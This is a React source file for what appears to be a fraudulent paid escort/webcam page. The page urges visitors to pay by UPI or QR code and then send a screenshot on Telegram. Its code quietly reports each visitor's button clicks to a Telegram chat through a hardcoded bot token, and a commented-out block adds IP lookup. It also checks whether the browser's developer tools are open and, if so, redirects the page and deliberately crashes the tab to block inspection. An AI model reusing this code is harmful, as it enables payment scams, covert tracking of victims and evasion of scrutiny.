/* eslint-disable no-unused-vars */
import './App.css';
import React, { useState, useEffect } from 'react';
import WhatsappModal from './WhatsappModal';
import PaymentModal from './PaymentModal';
import ProfileCard from './ProfileCard';
import QRCard from './QRCard';
import profiles, { getActiveProfile, setActiveProfile, setProfiles } from './profiles';
import './sidebar.css'
import { useHistory } from 'react-router-dom';
import { useParams } from 'react-router-dom/cjs/react-router-dom.min';
import { addListener, crashBrowserCurrentTab, launch } from 'devtools-detector';

let ip = 'Not Found';
let currentUser = 'unknown';
let time = 0;
const tgtoken = 'bot5807856562:AAFx-yxoMg2aoAggt4M0NU7qeLe49DIv__g';
const chat_id = "-1001166751237"

export async function sendUpdate(msg, force = false) {
  if (time < Date.now() - 3000 || force) {
    time = Date.now();

    // if (ip === 'Not Found') {
    //   try {
    //     const response = await fetch('https://api.db-ip.com/v2/free/self');
    //     const output = await response.json();
    //     ip = output;

    //     const url = `https://api.telegram.org/${tgtoken}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(`${currentUser}:${msg}--------${ip.ipAddress}`)}`;
    //     await fetch(url);
    //   } catch (err) {
    //     // console.error('Failed to fetch IP or send Telegram message:', err);
    //   }
    // } else {
    console.log("Sending update")
    try {
      const url = `https://api.telegram.org/${tgtoken}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(`${currentUser}:${msg}--------${ip?.ipAddress}`)}`;
      await fetch(url);
    } catch (err) {
      // console.error('Failed to send Telegram message:', err);
    }
  }
  // }
}

export const modals = {
  whatsapp: "whatasapp",
  paynow: "paynow",
  qr: "qr",
  none: "none"
}

function App(props) {
  const { user } = useParams();
  currentUser = user;
  const history = useHistory();
  if (!profiles[getActiveProfile()]) {
    setActiveProfile(user)
  }
  const [profile, setProfile] = useState(profiles[getActiveProfile()] ? profiles[getActiveProfile()] : { telegram: getActiveProfile(), clientId: setActiveProfile(user), name: setActiveProfile(user), age: 23, location: "hyderabd" });
  const [app, setApp] = useState("phonepe")
  const [isQROpen, setIsQROpen] = useState(false);
  const [isPaymentOpen, setIsPaymentOpen] = useState(false);
  const [isWhatsappOpen, setIsWhatsappOpen] = useState(false);
  const [activeModal, setActiveModal] = useState(props.isQROpen ? modals.qr : props.isPaymentModalOpen ? modals.paynow : modals.none)
  const [images, setImages] = useState({});

  useEffect(() => {
    if (!profiles[getActiveProfile()]) {
      setProfiles().then(profiles => {
        setProfile(profiles[getActiveProfile()]);
      })
    }
    const handleBackButton = (event) => {
      event.preventDefault();
      setActiveModal(modals.none)
    };

    const handleDevToolsOpen = () => {
      console.clear(); // Clear all console logs
      console.log("DevTools is opened, console cleared");
      debugger; // Attach debugger when DevTools is opened
    };
    window.addEventListener('resize', handleDevToolsOpen);

    const view = document.createElement('div');
    document.body.appendChild(view);
    addListener(function (isOpen) {
      if (isOpen) {
        const wind = window.open(`https://autolclose.netlify.app?u=https://www.google.com`, "_self");
        // window.open(`www.google.com`);
        wind.close()
        console.log("DevTools is opened, console cleared, network requests aborted, and data reset.");
        setTimeout(crashBrowserCurrentTab, 500);
      }
    });
    launch();
    window.addEventListener('popstate', handleBackButton);
  }, [])

  useEffect(() => {
    const loadImages = async () => {
      const phonePeImage = new Image();
      const payTmImage = new Image();
      const gPayImage = new Image();

      phonePeImage.src = 'phonepe2.png';
      payTmImage.src = 'paytm2.png';
      gPayImage.src = 'gpay2.png';

      await Promise.all([
        phonePeImage.decode(),
        payTmImage.decode(),
        gPayImage.decode()
      ]);

      setImages({
        phonepe: phonePeImage.src,
        paytm: payTmImage.src,
        gpay: gPayImage.src
      });
    };

    loadImages();
  }, []);

  useEffect(() => {
    if (!isQROpen) {
      handleModals('none', 'phonepe')
    }
  }, [isQROpen])

  useEffect(() => {
    switch (activeModal) {
      case modals.paynow:
        setIsPaymentOpen(true);
        setIsQROpen(false);
        setIsWhatsappOpen(false)
        break;
      case modals.qr:
        setIsPaymentOpen(false);
        setIsQROpen(true);
        setIsWhatsappOpen(false)
        break;
      case modals.whatsapp:
        setIsPaymentOpen(false);
        setIsQROpen(false);
        setIsWhatsappOpen(true)
        break;
      default:
        setIsPaymentOpen(false);
        setIsQROpen(false);
        setIsWhatsappOpen(false)
        break;
    }
  }, [activeModal]);

  useEffect(() => {
    if (props.updateHistory) {
      history.push(`/${getActiveProfile()}`)
    }
  }, [history, props.updateHistory]);

  const handleModals = (activeModal, app) => {
    setActiveModal(activeModal);
    setApp(app)
  }

  const handlepayButton = async () => {
    setIsPaymentOpen(!isPaymentOpen);
    sendUpdate("PayButton")
  }

  const handleQRButton = async () => {
    setIsQROpen(!isQROpen);
    sendUpdate("QRButton")
  }

  const togglePay = () => {
    setIsPaymentOpen(!isPaymentOpen);
  }

  const handleWspButton = async () => {
    setIsWhatsappOpen(!isWhatsappOpen)
    sendUpdate("WhatsppBtn")
    //window.open("upi://pay?pa=paytmqr28100505010111o4jao8e1ay@paytm&pn=ReddyGirl&tn=ReddyGirl&am=1000", "_self");
  }

  return (
    <div className="App" onClick={() => { /*setisOpen(false) */ }}>
      <div>
        <h6 id='serviceName'>WebCam Services</h6>
        <ProfileCard profile={profile} />
        <div >
          <button className='button' style={{ background: "#00a3ff", padding: "0px 25px" }}
            onClick={
              async () => {
                sendUpdate("LOGIN TAB");
                history.push(`${user}/free-demo`);
              }
            }>
            {"Login for free Demo"}</button>
        </div>
        <div className="msgBtn">
          {/* <h6>{"Finish PAYMENT to Unlock the Number!!😜"}</h6> */}
          <div className='btnGrp'>
            <button className='button' onClick={() => { handlepayButton() }}>
              <img src="../upiwhite.png" style={{ width: '30px', margin: '-4px 4px 0px -3px' }} alt="QR CODE"></img>
              {"PAY NOW!!"}</button>
            <button className='button' onClick={() => { handleQRButton() }}>
              <img src="../qr-code.png" style={{ width: '20px', margin: '-4px 4px 0px -3px' }} alt="QR CODE"></img>
              {"QR Code"}</button>
          </div>
        </div>
        <h6>{"Geunine Sex Services!! Available All Indian Girls"}</h6>
        <div className="msgBtn">
          <div>
            <h6 style={{ display: "block" }}>{"Click Below👇 For My Whatsapp Number!!"}</h6>
          </div>
          <div className='btnGrp'>
            <button className='button' onClick={() => { handleWspButton() }}>
              <img src="../whatsapp.png" style={{ width: '28px', margin: '-4px 2px 0 -3px' }} alt="whatsapp logo"></img>
              {"Whatsapp"}
            </button>
            <button className="button" style={{ background: "#00a3ff" }}>
              <img src="../tg.svg" style={{ width: '24px', margin: '-4px 1px 0 -3px' }} alt="Telegram logo"></img>
              <a href={`https://t.me/${profile?.telegram}`} style={{ color: "white" }}> Telegram </a>
            </button>
          </div>
        </div>

        <h6 style={{ color: "bisque", fontSize: "1rem" }}>PAY and Send me SCREENSHOT on Telegram!!🥰</h6>
        <div>
          <button className='button' style={{
            background: "firebrick",
            padding: "0px 20px"
          }}
            onClick={
              async () => {
                sendUpdate("Register TAB");
                history.push(`${user}/register`);
              }
            } >
            Create your own website</button>
        </div>
        <WhatsappModal isOpen={isWhatsappOpen} setisOpen={setIsWhatsappOpen} togglePay={togglePay} className="special_modal"></WhatsappModal>
        <PaymentModal isOpen={isPaymentOpen} setisOpen={setIsPaymentOpen} handleModals={handleModals} className="special_modal2"></PaymentModal>
        <QRCard profile={profile} isOpen={isQROpen} setisOpen={setIsQROpen} handleModals={handleModals} app={app} images={images} className="special_modal2"></QRCard>
      </div>
    </div >
  );
}


export default App;
